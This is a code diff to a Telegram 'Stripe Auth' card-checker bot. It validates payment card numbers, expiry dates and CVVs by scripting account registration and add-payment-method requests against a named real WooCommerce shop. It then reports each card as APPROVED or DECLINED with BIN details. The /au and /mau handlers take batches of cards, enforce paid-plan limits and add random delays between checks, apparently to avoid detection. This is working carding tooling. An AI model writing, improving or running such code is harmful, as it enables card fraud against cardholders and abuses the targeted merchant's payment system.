-                    return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection timeout", username, time.time()-start_time)
+                    error_json = ajax_response.json()
+                    if isinstance(error_json, dict):
+                        if 'data' in error_json and 'message' in error_json['data']:
+                            error_detail = error_json['data']['message']
+                except:
+                    pass
 
-                # Register a new account
-                reg_data = {
-                    "email": email,
-                    "password": password,
-                    "mailchimp_woocommerce_gdpr[cedcdfe02a]": "0",
-                    "wc_order_attribution_source_type": "typein",
-                    "wc_order_attribution_referrer": "(none)",
-                    "wc_order_attribution_utm_campaign": "(none)",
-                    "wc_order_attribution_utm_source": "(direct)",
-                    "wc_order_attribution_utm_medium": "(none)",
-                    "wc_order_attribution_utm_content": "(none)",
-                    "wc_order_attribution_utm_id": "(none)",
-                    "wc_order_attribution_utm_term": "(none)",
-                    "wc_order_attribution_utm_source_platform": "(none)",
-                    "wc_order_attribution_utm_creative_format": "(none)",
-                    "wc_order_attribution_utm_marketing_tactic": "(none)",
-                    "wc_order_attribution_session_entry": "https://blackdonkeybeer.com/my-account/",
-                    "wc_order_attribution_session_start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                    "wc_order_attribution_session_pages": "12",
-                    "wc_order_attribution_session_count": "1",
-                    "wc_order_attribution_user_agent": self.user_agent,
-                    "woocommerce-register-nonce": nonce_match.group(1),
-                    "_wp_http_referer": "/my-account/",
-                    "register": "Register"
-                }
+                bin_info = await self.get_bin_info(cc)
+                return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"AJAX Error: {error_detail}", username, time.time()-start_time, bin_info)
 
-                try:
-                    reg_res = await client.post(
-                        "https://blackdonkeybeer.com/my-account/",
-                        data=reg_data,
-                        timeout=20.0
-                    )
-                except (httpx.TimeoutException, httpx.ConnectError):
-                    return await self.format_response(cc, mes, ano, cvv, "ERROR", "Registration timeout", username, time.time()-start_time)
+            try:
+                result = ajax_response.json()
+                print(f"AJAX Response: {result}")
 
-                # Check if registration was successful by checking the response URL and content
-                reg_res_url = str(reg_res.url)
-                reg_res_text = reg_res.text.lower()
-                
-                # More comprehensive registration success checks
-                registration_success = (
-                    "dashboard" in reg_res_text or 
-                    "my-account" in reg_res_url or
-                    "logout" in reg_res_text or
-                    "account details" in reg_res_text or
-                    "hello" in reg_res_text
-                )
-                
-                if not registration_success:
-                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Registration failed - cannot create account", username, time.time()-start_time)
-
-                # Get payment method page to extract Stripe elements
-                try:
-                    payment_page = await client.get("https://blackdonkeybeer.com/my-account/add-payment-method/", timeout=15.0)
-                except (httpx.TimeoutException, httpx.ConnectError):
-                    return await self.format_response(cc, mes, ano, cvv, "ERROR", "Payment page timeout", username, time.time()-start_time)
-
-                # Extract the form nonce
-                form_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', payment_page.text)
-                if not form_nonce_match:
-                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Cannot get payment form nonce", username, time.time()-start_time)
-
-                form_nonce = form_nonce_match.group(1)
-
-                # Extract the form action URL
-                form_action_match = re.search(r'<form[^>]+action="([^"]+)"[^>]*>', payment_page.text)
-                form_action = form_action_match.group(1) if form_action_match else "https://blackdonkeybeer.com/my-account/add-payment-method/"
-
-                # Submit the payment method form directly with appropriate country data
-                payment_form_data = {
-                    "payment_method": "stripe",
-                    "wc-stripe-payment-token": "",
-                    "stripe_card_number": cc,
-                    "stripe_exp_month": mes,
-                    "stripe_exp_year": ano,
-                    "stripe_cvc": cvv,
-                    "stripe_billing_postalcode": zip_code,
-                    "stripe_billing_country": country_code,
-                    "woocommerce-add-payment-method-nonce": form_nonce,
-                    "_wp_http_referer": "/my-account/add-payment-method/",
-                    "woocommerce_add_payment_method": "1"
-                }
-
-                try:
-                    payment_res = await client.post(
-                        form_action,
-                        data=payment_form_data,
-                        headers={
-                            "Content-Type": "application/x-www-form-urlencoded",
-                            "Referer": "https://blackdonkeybeer.com/my-account/add-payment-method/",
-                            "Origin": "https://blackdonkeybeer.com"
-                        },
-                        timeout=25.0
-                    )
-                except (httpx.TimeoutException, httpx.ConnectError):
-                    return await self.format_response(cc, mes, ano, cvv, "ERROR", "Payment timeout", username, time.time()-start_time)
-
-                # Check if the payment method was added successfully - IMPROVED DETECTION
-                payment_res_url = str(payment_res.url)
-                payment_res_text = payment_res.text.lower()
-
-                # Comprehensive success detection
-                success_indicators = [
-                    "payment method successfully added",
-                    "payment-methods",
-                    "payment method has been added",
-                    "card added successfully",
-                    "payment method saved",
-                    "method added successfully"
-                ]
-
-                # Comprehensive failure detection
-                failure_indicators = [
-                    "declined",
-                    "invalid",
-                    "error",
-                    "failed",
-                    "cannot be processed",
-                    "try again",
-                    "unsuccessful",
-                    "card was declined",
-                    "card number is incorrect",
-                    "security code is invalid",
-                    "expiration date is invalid"
-                ]
-
-                success_detected = any(indicator in payment_res_text for indicator in success_indicators)
-                failure_detected = any(indicator in payment_res_text for indicator in failure_indicators)
-
-                if success_detected:
-                    return await self.format_response(cc, mes, ano, cvv, "APPROVED", "Card successfully added to payment methods", username, time.time()-start_time)
-                elif failure_detected:
-                    # Try to extract specific error message
-                    error_match = re.search(r'<div[^>]*class="[^"]*woocommerce-error[^"]*"[^>]*>(.*?)</div>', payment_res.text, re.IGNORECASE | re.DOTALL)
-                    if error_match:
-                        error_message = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
-                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_message, username, time.time()-start_time)
-                    else:
-                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Card declined by issuer", username, time.time()-start_time)
+                if result.get("success"):
+                    bin_info = await self.get_bin_info(cc)
+                    return await self.format_response(cc, mes, ano, cvv, "APPROVED", "Successful", username, time.time()-start_time, bin_info)
                 else:
-                    # If we can't clearly determine, check URL pattern
-                    if "payment-methods" in payment_res_url:
-                        return await self.format_response(cc, mes, ano, cvv, "APPROVED", "Card successfully added to payment methods", username, time.time()-start_time)
-                    else:
-                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Unable to add payment method", username, time.time()-start_time)
+                    error_data = result.get("data", {})
+                    error_message = "Transaction Declined"
 
-        except httpx.ConnectError:
-            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection error", username, time.time()-start_time)
+                    # Extract detailed error message
+                    if isinstance(error_data, dict):
+                        if "error" in error_data:
+                            error_obj = error_data["error"]
+                            if isinstance(error_obj, dict):
+                                error_message = error_obj.get("message", "Card Declined")
+                            else:
+                                error_message = str(error_obj)
+                        elif "message" in error_data:
+                            error_message = error_data["message"]
+                    elif isinstance(error_data, str):
+                        error_message = error_data
+
+                    bin_info = await self.get_bin_info(cc)
+                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_message, username, time.time()-start_time, bin_info)
+
+            except json.JSONDecodeError as e:
+                bin_info = await self.get_bin_info(cc)
+                return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Invalid server response", username, time.time()-start_time, bin_info)
+
         except httpx.TimeoutException:
-            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Timeout error", username, time.time()-start_time)
+            if client:
+                await client.aclose()
+            bin_info = await self.get_bin_info(cc)
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, time.time()-start_time, bin_info)
+        except httpx.ConnectError:
+            if client:
+                await client.aclose()
+            bin_info = await self.get_bin_info(cc)
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed", username, time.time()-start_time, bin_info)
         except Exception as e:
-            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)}", username, time.time()-start_time)
-
-    def format_result(self, result, username, user_plan):
-        return result
+            if client:
+                await client.aclose()
+            bin_info = await self.get_bin_info(cc) if cc else None
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)[:80]}", username, time.time()-start_time, bin_info)
 
 async def handle_stripe_auth(event):
-    user_id = event.sender_id
-    if is_user_banned(user_id):
-        await event.respond("⛔ You have been banned from using this bot.")
-        return
+    try:
+        user_id = event.sender_id
+        if is_user_banned(user_id):
+            await event.respond("⛔ You have been banned from using this bot.")
+            return
 
-    args = event.message.text.split()
-    if len(args) < 2:
-        await event.respond("❗Please provide card details in format: `/au cc|mm|yy|cvv`")
-        return
+        args = event.message.text.split()
+        if len(args) < 2:
+            await event.respond("❗Please provide card details in format: `/au cc|mm|yy|cvv`")
+            return
 
-    card_details = args[1]
-    username = event.sender.username or str(user_id)
-    user_plan = get_user_plan(user_id)
+        card_details = args[1]
+        username = event.sender.username or str(user_id)
+        user_plan = get_user_plan(user_id)
 
-    can_use, reason = can_user_use_command(user_id, event.is_group, is_gate_command=True)
-    if not can_use:
-        await event.respond(reason)
-        return
+        # Check usage limits - pass is_gate_command=True for /au command
+        can_use, reason = can_user_use_command(user_id, event.is_group, is_gate_command=True)
+        if not can_use:
+            await event.respond(reason)
+            return
 
-    session = get_user_session(user_id)
-    checker = StripeAuthChecker(session)
-
-    cc_parts = card_details.split('|')
-    if len(cc_parts) < 4:
-        await event.respond("❌ Invalid card format. Use: `/au cc|mm|yy|cvv`")
-        return
-
-    cc = cc_parts[0]
-    mes = cc_parts[1]
-    ano = cc_parts[2]
-    cvv = cc_parts[3]
-
-    processing_msg = await event.respond(
-        checker.get_processing_message(cc, mes, ano, cvv, username, user_plan))
-
-    result = await checker.check_card(card_details, username, user_plan)
-
-    increment_gate_usage(user_id)
-    update_user_cooldown(user_id)
-
-    await processing_msg.edit(result)
-
-async def handle_mass_stripe_auth(event):
-    user_id = event.sender_id
-    if is_user_banned(user_id):
-        await event.respond("⛔ You have been banned from using this bot.")
-        return
-
-    args = event.message.text.split('\n')
-    if len(args) < 2:
-        await event.respond("❗Please provide card details in format (max 5 cards):\n"
-                           "`/mau`\n"
-                           "`cc|mm|yy|cvv`\n"
-                           "`cc|mm|yy|cvv`\n"
-                           "...")
-        return
-
-    username = event.sender.username or str(user_id)
-    user_plan = get_user_plan(user_id)
-
-    can_use, reason = can_user_use_command(user_id, event.is_group, is_gate_command=True)
-    if not can_use:
-        await event.respond(reason)
-        return
-
-    session = get_user_session(user_id)
-    checker = StripeAuthChecker(session)
-
-    card_list = [card.strip() for card in args[1:] if card.strip()]
-
-    if len(card_list) > 5:
-        await event.respond("❌ Maximum 5 cards allowed per request.")
-        return
-
-    processing_msg = await event.respond("Processing....")
-
-    results = []
-    for card_details in card_list:
-        card_details = card_details.strip()
-        if not card_details:
-            continue
+        session = get_user_session(user_id)
+        checker = StripeAuthChecker(session)
 
         cc_parts = card_details.split('|')
-        if len(cc_parts) != 4:
-            results.append("❌ Invalid format: Use CC|MM|YY|CVV")
-            continue
+        if len(cc_parts) < 4:
+            await event.respond("❌ Invalid card format. Use: `/au cc|mm|yy|cvv`")
+            return
 
-        cc, mes, ano, cvv = cc_parts
-        cc = cc.strip()
-        mes = mes.strip()
-        ano = ano.strip()
-        cvv = cvv.strip()
+        cc = cc_parts[0]
+        mes = cc_parts[1]
+        ano = cc_parts[2]
+        cvv = cc_parts[3]
+
+        processing_msg = await event.respond(
+            checker.get_processing_message(cc, mes, ano, cvv, username, user_plan))
 
         result = await checker.check_card(card_details, username, user_plan)
-        results.append(result)
 
+        # Update gate usage and cooldown
         increment_gate_usage(user_id)
         update_user_cooldown(user_id)
 
-        await asyncio.sleep(random.uniform(2, 3))
+        await processing_msg.edit(result)
 
-    response = "🔐 **Stripe Auth [ /mau ]**\n"
-    response += "▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
-    for i, result in enumerate(results):
-        response += f"**Card {i + 1}:**\n{result}\n"
-        if i < len(results) - 1:
-            response += "▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
+    except Exception as e:
+        error_msg = str(e)[:150]
+        await event.respond(f"❌ Bot error in /au command: {error_msg}")
 
-    response += "˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
-    await processing_msg.edit(response)
+async def handle_mass_stripe_auth(event):
+    try:
+        user_id = event.sender_id
+        if is_user_banned(user_id):
+            await event.respond("⛔ You have been banned from using this bot.")
+            return
+
+        args = event.message.text.split('\n')
+        if len(args) < 2:
+            await event.respond("❗Please provide card details in format (max 2 cards):\n"
+                               "`/mau`\n"
+                               "`cc|mm|yy|cvv`\n"
+                               "`cc|mm|yy|cvv`\n"
+                               "...")
+            return
+
+        username = event.sender.username or str(user_id)
+        user_plan = get_user_plan(user_id)
+
+        # Check usage limits - pass is_gate_command=True for /mau command
+        can_use, reason = can_user_use_command(user_id, event.is_group, is_gate_command=True)
+        if not can_use:
+            await event.respond(reason)
+            return
+
+        session = get_user_session(user_id)
+        checker = StripeAuthChecker(session)
+
+        card_list = [card.strip() for card in args[1:] if card.strip()]
+
+        if len(card_list) > 2:
+            await event.respond("❌ Maximum 2 cards allowed per mass request.")
+            return
+
+        processing_msg = await event.respond("🔄 Starting mass Stripe auth check...")
+
+        results = []
+        successful = 0
+        failed = 0
+
+        for i, card_details in enumerate(card_list):
+            card_details = card_details.strip()
+            if not card_details:
+                continue
+
+            cc_parts = card_details.split('|')
+            if len(cc_parts) != 4:
+                results.append(f"❌ Invalid format: {card_details}")
+                failed += 1
+                continue
+
+            cc, mes, ano, cvv = cc_parts
+            cc = cc.strip()
+            mes = mes.strip()
+            ano = ano.strip()
+            cvv = cvv.strip()
+
+            await processing_msg.edit(f"🔄 Processing card {i+1}/{len(card_list)}: `{cc}|{mes}|{ano}|{cvv}`")
+
+            result = await checker.check_card(card_details, username, user_plan)
+            results.append(result)
+
+            if "APPROVED" in result:
+                successful += 1
+            else:
+                failed += 1
+
+            increment_gate_usage(user_id)
+            update_user_cooldown(user_id)
+
+            if i < len(card_list) - 1:
+                await asyncio.sleep(random.uniform(12, 18))
+
+        response = f"🔍 **Mass Stripe Auth Results**\n"
+        response += f"✅ Approved: {successful} | ❌ Declined: {failed}\n\n"
+
+        for i, result in enumerate(results):
+            response += f"**Card {i+1}:**\n{result}\n\n"
+
+        response += f"📊 Total: {len(card_list)} | Checked by: @{username}"
+
+        await processing_msg.edit(response)
+
+    except Exception as e:
+        error_msg = str(e)[:150]
+        await event.respond(f"❌ Bot error in /mau command: {error_msg}")
